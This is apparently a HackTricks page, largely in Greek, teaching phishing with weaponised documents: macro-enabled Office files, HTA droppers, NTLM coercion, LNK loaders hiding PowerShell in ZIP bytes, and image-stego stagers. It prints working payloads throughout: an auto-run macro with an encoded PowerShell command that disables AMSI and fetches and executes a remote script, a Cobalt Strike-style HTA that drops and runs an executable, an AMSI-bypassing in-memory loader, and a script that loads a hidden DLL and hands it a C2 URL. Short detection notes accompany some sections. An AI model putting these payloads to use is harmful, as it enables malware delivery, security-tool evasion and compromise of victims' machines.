# Phishing Αρχεία & Έγγραφα

{{#include ../../banners/hacktricks-training.md}}

## Office Έγγραφα

Microsoft Word πραγματοποιεί επικύρωση δεδομένων αρχείου πριν ανοίξει ένα αρχείο. Η επικύρωση δεδομένων πραγματοποιείται με τη μορφή αναγνώρισης δομής δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Εάν προκύψει οποιοδήποτε σφάλμα κατά την αναγνώριση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοίξει.

Συνήθως, τα αρχεία Word που περιέχουν macros χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατό να μετονομαστεί το αρχείο αλλάζοντας την επέκταση και να διατηρηθούν οι δυνατότητες εκτέλεσης macros.\
Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει macros, εκ κατασκευής, αλλά ένα αρχείο DOCM που μετονομάζεται σε RTF θα χειριστείται από το Microsoft Word και θα είναι ικανό για εκτέλεση macros.\
Οι ίδιες εσωτερικές λειτουργίες και μηχανισμοί ισχύουν για όλο το λογισμικό της Microsoft Office Suite (Excel, PowerPoint κ.λπ.).

Μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή για να ελέγξετε ποιες επεκτάσεις θα εκτελούνται από ορισμένα προγράμματα του Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### Φόρτωση εξωτερικής εικόνας

Go to: _Insert --> Quick Parts --> Field_\
_**Κατηγορίες**: Links and References, **Ονόματα πεδίων**: includePicture, και **Όνομα αρχείου ή URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Είναι δυνατό να χρησιμοποιηθούν macros για να εκτελέσουν arbitrary code από το έγγραφο.

#### Autoload functions

The more common they are, the more probable the AV will detect them.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Αφαίρεση μεταδεδομένων χειροκίνητα

Μεταβείτε στο **File > Info > Inspect Document > Inspect Document**, το οποίο θα ανοίξει τον Επιθεωρητή Εγγράφων (Document Inspector). Κάντε κλικ στο **Inspect** και στη συνέχεια στο **Remove All** δίπλα από τις **Document Properties and Personal Information**.

#### Doc Extension

Όταν τελειώσετε, επιλέξτε το αναπτυσσόμενο μενού **Save as type**, αλλάξτε τη μορφή από **`.docx`** σε **Word 97-2003 `.doc`**.\
Κάντε αυτό επειδή **δεν μπορείτε να αποθηκεύσετε macro μέσα σε ένα `.docx`** και υπάρχει ένα **στίγμα** **γύρω** από την macro-enabled **`.docm`** επέκταση (π.χ. το εικονίδιο μικρογραφίας έχει ένα μεγάλο `!` και κάποιοι web/email gateway τα μπλοκάρουν εντελώς). Επομένως, αυτή η **παλιά επέκταση `.doc` είναι ο καλύτερος συμβιβασμός**.

#### Γεννήτριες κακόβουλων macro

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Αρχεία HTA

Ένα HTA είναι ένα πρόγραμμα Windows που **συνδυάζει HTML και scripting languages (όπως VBScript και JScript)**. Δημιουργεί τη διεπαφή χρήστη και εκτελείται ως εφαρμογή "fully trusted", χωρίς τους περιορισμούς του μοντέλου ασφάλειας ενός browser.

Ένα HTA εκτελείται χρησιμοποιώντας **`mshta.exe`**, το οποίο συνήθως είναι **εγκατεστημένο** μαζί με τον **Internet Explorer**, κάνοντας **`mshta` εξαρτώμενο από το IE**. Έτσι, αν έχει απεγκατασταθεί, τα HTA δεν θα μπορούν να εκτελεστούν.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Εξαναγκασμός NTLM αυθεντικοποίησης

Υπάρχουν πολλοί τρόποι να **εξαναγκάσετε NTLM authentication «απομακρυσμένα»**, για παράδειγμα, μπορείτε να προσθέσετε **αόρατες εικόνες** σε emails ή HTML που θα προσπελάσει ο χρήστης (ακόμα και HTTP MitM?). Ή να στείλετε στο θύμα τη **διεύθυνση αρχείων** που θα **προκαλέσει** μια **αυθεντικοποίηση** απλά με το **άνοιγμα του φακέλου.**

**Δείτε αυτές τις ιδέες και περισσότερα στις ακόλουθες σελίδες:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Μην ξεχνάτε ότι δεν μπορείτε μόνο να κλέψετε το hash ή την αυθεντικοποίηση αλλά και να **εκτελέσετε NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Ιδιαίτερα αποτελεσματικές καμπάνιες παραδίδουν ένα ZIP που περιέχει δύο νόμιμα δόλωμα έγγραφα (PDF/DOCX) και ένα κακόβουλο .lnk. Το κόλπο είναι ότι ο πραγματικός PowerShell loader αποθηκεύεται μέσα στα raw bytes του ZIP μετά από έναν μοναδικό marker, και το .lnk τον εξάγει και τον εκτελεί πλήρως στη μνήμη.

Τυπική ροή που υλοποιείται από τον PowerShell one-liner του .lnk:

1) Εντοπίστε το αρχικό ZIP σε κοινά μονοπάτια: Desktop, Downloads, Documents, %TEMP%, %ProgramData% και τον γονικό φάκελο του τρέχοντος καταλόγου εργασίας.
2) Διαβάστε τα bytes του ZIP και βρείτε έναν hardcoded marker (π.χ., xFIQCV). Ό,τι βρίσκεται μετά το marker είναι το ενσωματωμένο PowerShell payload.
3) Αντιγράψτε το ZIP στο %ProgramData%, αποσυμπιέστε το εκεί και ανοίξτε το δόλωμα .docx για να φαίνεται νόμιμο.
4) Παρακάμψτε το AMSI για την τρέχουσα διεργασία: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Απο-αποκρύψτε/αφαιρέστε την obfuscation του επόμενου σταδίου (π.χ., αφαιρέστε όλους τους χαρακτήρες '#') και εκτελέστε το στη μνήμη.

Παράδειγμα PowerShell skeleton για να εξάγετε και να εκτελέσετε το ενσωματωμένο στάδιο:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Σημειώσεις
- Η παράδοση συχνά καταχράται αξιόπιστους PaaS υποτομείς (π.χ., *.herokuapp.com) και μπορεί να περιορίζει τα payloads (σερβίρει αθώα ZIPs με βάση IP/UA).
- Το επόμενο στάδιο συχνά αποκρυπτογραφεί base64/XOR shellcode και το εκτελεί μέσω Reflection.Emit + VirtualAlloc για να ελαχιστοποιήσει τα ίχνη στο δίσκο.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. Δείτε λεπτομέρειες και έτοιμες εντολές εδώ:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP αρχεία που περιέχουν το ASCII marker string (π.χ., xFIQCV) προσαρτημένο στα δεδομένα του αρχείου.
- .lnk που απαριθμεί γονικούς/φακέλους χρήστη για να εντοπίσει το ZIP και ανοίγει ένα decoy document.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Μακροχρόνια business threads που καταλήγουν σε links φιλοξενούμενα υπό αξιόπιστους PaaS domains.

## Steganography-delimited payloads in images (PowerShell stager)

Πρόσφατες αλυσίδες loader παραδίδουν obfuscated JavaScript/VBS που αποκωδικοποιεί και εκτελεί έναν Base64 PowerShell stager. Ο stager αυτός κατεβάζει μια εικόνα (συχνά GIF) που περιέχει μια Base64-encoded .NET DLL κρυμμένη ως απλό κείμενο ανάμεσα σε μοναδικούς start/end markers. Το script αναζητά αυτούς τους delimiters (παραδείγματα που έχουν παρατηρηθεί: «<<sudo_png>> … <<sudo_odt>>>»), εξάγει το μεταξύ-κείμενο, Base64-decodes το σε bytes, φορτώνει την assembly in-memory και καλεί έναν γνωστό entry method με το C2 URL.

Workflow
- Stage 1: Archived JS/VBS dropper → αποκωδικοποιεί ενσωματωμένο Base64 → ξεκινάει PowerShell stager με -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → κατεβάζει εικόνα, εξάγει marker-delimited Base64, φορτώνει τη .NET DLL in-memory και καλεί τη μέθοδό της (π.χ., VAI) δίνοντας το C2 URL και options.
- Stage 3: Loader ανακτά το τελικό payload και τυπικά το εγχέει μέσω process hollowing σε ένα trusted binary (συνήθως MSBuild.exe). Δείτε περισσότερα για process hollowing και trusted utility proxy execution εδώ:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Σημειώσεις
- This is ATT&CK T1027.003 (steganography/marker-hiding). Οι δείκτες διαφέρουν μεταξύ καμπανιών.
- AMSI/ETW bypass και string deobfuscation εφαρμόζονται συνήθως πριν φορτωθεί το assembly.
- Hunting: σκανάρετε τις ληφθείσες εικόνες για γνωστά delimiters· εντοπίστε PowerShell που προσπελαύνει εικόνες και αμέσως αποκωδικοποιεί Base64 blobs.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.

Σκελετική λογική (αφηρημένη):
- Read own file contents
- Locate a Base64 blob between junk strings
- Decode to ASCII PowerShell
- Execute with `wscript.exe`/`cscript.exe` invoking `powershell.exe`

Σημάδια ανίχνευσης
- Archived JS/VBS attachments spawning `powershell.exe` with `-enc`/`FromBase64String` in the command line.
- `wscript.exe` launching `powershell.exe -nop -w hidden` from user temp paths.

## Windows files to steal NTLM hashes

Δείτε τη σελίδα σχετικά με **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Αναφορές

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
